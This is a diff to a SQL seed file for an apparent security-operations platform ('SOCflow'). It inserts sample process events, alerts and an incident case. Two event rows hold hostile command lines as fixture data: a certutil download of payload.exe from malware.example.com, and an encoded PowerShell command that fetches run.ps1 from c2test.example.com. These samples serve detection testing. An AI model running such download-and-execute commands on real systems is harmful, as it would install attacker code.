@@ -321,10 +321,22 @@ INSERT IGNORE INTO soc_detection_rule (rule_id, rule_name, description, techniqu
 INSERT IGNORE INTO soc_process_event (event_id, host_id, agent_id, provider, event_type, timestamp, user_name, process_name, command_line) VALUES
 (1, 1, 1, 'Sysmon', 'ProcessCreate', CURRENT_TIMESTAMP, 'SYSTEM',
  'certutil.exe',
- 'certutil.exe -urlcache -split -f http://malware.example.com/payload.exe C:\Windows\Temp\payload.exe'),
+ 'certutil.exe -urlcache -split -f http://malware.example.com/payload.exe C:\\Windows\\Temp\\payload.exe'),
 (2, 2, 2, 'Sysmon', 'ProcessCreate', CURRENT_TIMESTAMP, 'User1',
  'powershell.exe',
  'powershell.exe -enc ZWNobyAiSGFja2VkIjsgSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MydGVzdC5leGFtcGxlLmNvbS9ydW4ucHMx');
 
+INSERT IGNORE INTO soc_alert_reference (alert_id, host_id, agent_id, event_ref_id, rule_id, severity, description, status, confidence_score, detection_source) VALUES
+(1, 1, 1, 1, 1, 'critical', 'CertUtil File Download: Ingress Tool Transfer (T1105) to C:\\Windows\\Temp', 'new', 90, 'rule'),
+(2, 2, 2, 2, 3, 'high', 'PowerShell Encoded Command: Obfuscated Base64 script execution (T1059.001)', 'open', 80, 'rule');
+
+INSERT IGNORE INTO soc_case (case_id, title, description, priority, status, created_by, assigned_to) VALUES
+(1, 'INC-2026-001: LOLBin Ingress & Execution Incident', 'Correlated CertUtil and PowerShell attacks identified across Finance Server and Dev Workstation.', 'critical', 'open', 1, 2);
+
+INSERT IGNORE INTO soc_case_alerts (case_id, alert_id) VALUES
+(1, 1),
+(1, 2);
+
 INSERT IGNORE INTO soc_audit_log (user_id, action_type, object_type, object_id, details) VALUES
-(1, 'SYSTEM_INIT', 'SYSTEM', NULL, '{"message": "SOCflow database initialized"}');
+(1, 'SYSTEM_INIT', 'SYSTEM', NULL, '{"message": "SOCflow database initialized with default security telemetry"}');
+
